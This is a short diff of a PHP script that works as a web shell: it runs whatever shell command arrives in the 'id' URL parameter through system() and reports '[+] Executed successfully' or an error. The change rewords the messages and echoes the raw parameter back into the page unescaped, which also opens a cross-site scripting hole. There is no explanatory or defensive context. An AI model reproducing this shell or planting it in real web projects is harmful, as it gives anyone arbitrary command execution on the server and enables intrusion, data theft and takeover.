@@ -1,8 +1,8 @@
 <?php
-	echo '<pre><hr/>';
+	echo '<pre>[*]Your command is: <strong>'.$_GET['id'].'</strong><hr/>';
 	system($_GET['id'],$bool);
 	if($bool!=0){
-		echo'<strong>[-] Command not found!</strong><hr/></pre>';
+		echo'<strong>[-] Command not found or do not have permission to execute.</strong><hr/></pre>';
 	}else{
 		echo'<hr/><strong>[+] Executed successfully</strong></pre>';
 	}
